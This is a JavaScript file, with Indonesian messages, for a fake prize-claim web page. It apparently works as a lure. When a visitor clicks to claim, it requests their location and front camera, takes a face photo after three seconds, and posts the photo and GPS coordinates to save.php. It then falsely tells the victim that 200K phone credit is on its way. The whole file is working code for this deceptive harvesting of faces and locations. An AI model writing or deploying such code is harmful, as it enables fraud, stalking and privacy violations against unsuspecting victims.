// File: capture.js
document.addEventListener('DOMContentLoaded', function() {
    const claimBtn = document.getElementById('claimBtn');
    const cameraContainer = document.getElementById('cameraContainer');
    const statusDiv = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    
    let stream = null;
    
    claimBtn.addEventListener('click', function() {
        statusDiv.textContent = "Meminta izin...";
        
        // Minta izin lokasi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    // Minta izin kamera setelah lokasi berhasil
                    requestCameraAccess(lat, lng);
                },
                function(error) {
                    statusDiv.textContent = "Izin lokasi diperlukan untuk klaim hadiah.";
                    console.error("Geolocation error:", error);
                }
            );
        } else {
            statusDiv.textContent = "Browser Anda tidak mendukung geolocation.";
        }
    });
    
    function requestCameraAccess(lat, lng) {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(function(mediaStream) {
                    stream = mediaStream;
                    video.srcObject = stream;
                    cameraContainer.style.display = 'block';
                    statusDiv.textContent = "Arahkan wajah Anda ke kamera...";
                    
                    // Set timeout untuk mengambil foto setelah 3 detik
                    setTimeout(() => {
                        capturePhoto(lat, lng);
                    }, 3000);
                })
                .catch(function(err) {
                    statusDiv.textContent = "Izin kamera diperlukan: " + err.message;
                    console.error("Camera error:", err);
                });
        } else {
            statusDiv.textContent = "Browser Anda tidak mendukung akses kamera.";
        }
    }
    
    function capturePhoto(lat, lng) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Stop kamera
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        // Konversi ke data URL
        const imageData = canvas.toDataURL('image/jpeg');
        
        // Kirim data ke server
        sendDataToServer(imageData, lat, lng);
    }
    
    function sendDataToServer(imageData, lat, lng) {
        statusDiv.textContent = "Mengirim data...";
        
        const formData = new FormData();
        formData.append('image', imageData);
        formData.append('latitude', lat);
        formData.append('longitude', lng);
        
        fetch('save.php', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(result => {
            statusDiv.textContent = "🎉 Selamat! Hadiah Anda berhasil diklaim. Pulsa 200K akan segera dikirim!";
            claimBtn.style.display = 'none';
            cameraContainer.style.display = 'none';
            
            // Animasi konfetti
            createConfetti();
        })
        .catch(error => {
            statusDiv.textContent = "Terjadi kesalahan: " + error.message;
            console.error('Error:', error);
        });
    }
    
    function createConfetti() {
        const confettiCount = 200;
        const container = document.querySelector('.container');
        
        for (let i = 0; i < confettiCount; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + '%';
            confetti.style.animationDelay = Math.random() * 5 + 's';
            confetti.style.backgroundColor = getRandomColor();
            container.appendChild(confetti);
        }
        
        // Tambahkan style untuk confetti
        const style = document.createElement('style');
        style.textContent = `
            .confetti {
                position: absolute;
                width: 10px;
                height: 10px;
                background-color: #f00;
                top: -10px;
                opacity: 0.7;
                animation: fall 5s linear forwards;
            }
            
            @keyframes fall {
                0% { transform: translateY(0) rotate(0deg); opacity: 0.7; }
                100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    function getRandomColor() {
        const colors = ['#ff2e63', '#08d9d6', '#ff9a3c', '#f6f7d7', '#3d84b8'];
        return colors[Math.floor(Math.random() * colors.length)];
    }
});